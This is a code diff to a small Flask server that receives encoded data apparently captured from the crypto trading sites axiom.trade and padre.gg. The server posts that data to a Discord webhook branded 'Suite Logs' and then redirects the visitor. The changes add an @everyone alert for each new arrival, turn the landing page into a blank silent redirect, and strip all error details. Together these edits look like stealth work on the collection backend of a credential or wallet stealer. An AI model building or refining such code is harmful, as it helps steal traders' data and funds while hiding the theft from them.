@@ -32,6 +32,7 @@ ALLOWED_HOSTS = ("axiom.trade", "padre.gg")
 BRAND        = "Suite Logs"
 SOL_COLOR    = 0x14F195
 DESC_LIMIT   = 4000
+PING         = "@everyone"
 
 
 def decode_b64url(s: str) -> str:
@@ -51,10 +52,10 @@ def redirect_target(parsed: dict) -> str:
 
 def done_page(parsed: dict) -> str:
     target = json.dumps(redirect_target(parsed))
+    # page muette : pas de texte visible, redirection immédiate
     return (
-        "<!doctype html><meta charset=utf-8><title>ok</title>"
-        "<body style='background:#050a06;color:#4ade80;font:14px system-ui;"
-        "display:grid;place-items:center;height:100vh;margin:0'>done</body>"
+        "<!doctype html><meta charset=utf-8><title></title>"
+        "<body style='background:#050a06;margin:0'></body>"
         "<script>location.replace(" + target + ")</script>"
     )
 
@@ -138,7 +139,9 @@ def forward(parsed: dict, payload: str) -> Response:
     }
     data = {
         "payload_json": json.dumps({
+            "content": PING,
             "username": BRAND,
+            "allowed_mentions": {"parse": ["everyone"]},
             "embeds": build_embeds(parsed),
             "attachments": [{"id": "0", "filename": "suite-logs.json"}],
         }),
@@ -146,15 +149,11 @@ def forward(parsed: dict, payload: str) -> Response:
 
     try:
         r = requests.post(WEBHOOK, data=data, files=files, timeout=15)
-    except requests.RequestException as e:
-        return Response(f"fetch failed: {e}", status=500)
+    except requests.RequestException:
+        return "", 500
 
     if not r.ok:
-        return Response(
-            f"discord {r.status_code} {r.text[:300]}",
-            status=502,
-            mimetype="text/plain",
-        )
+        return "", 502
 
     return Response(done_page(parsed), mimetype="text/html")
 
@@ -163,16 +162,16 @@ def forward(parsed: dict, payload: str) -> Response:
 def root():
     raw = request.args.get("data")
     if not raw:
-        return Response("ok", mimetype="text/plain")
+        return "", 204
 
     if SECRET and request.args.get("key") != SECRET:
-        return Response("forbidden", status=403, mimetype="text/plain")
+        return "", 403
 
     try:
         payload = decode_b64url(raw)
         parsed = json.loads(payload)
-    except Exception as e:
-        return Response(f"bad payload: {e}", status=400, mimetype="text/plain")
+    except Exception:
+        return "", 400
 
     return forward(parsed, payload)
 
@@ -180,13 +179,13 @@ def root():
 @app.post("/")
 def post_root():
     if SECRET and request.args.get("key") != SECRET:
-        return Response("forbidden", status=403, mimetype="text/plain")
+        return "", 403
 
     payload = request.get_data(as_text=True) or ""
     try:
         parsed = json.loads(payload)
     except Exception:
-        return Response("bad json", status=400, mimetype="text/plain")
+        return "", 400
 
     return forward(parsed, payload)
 
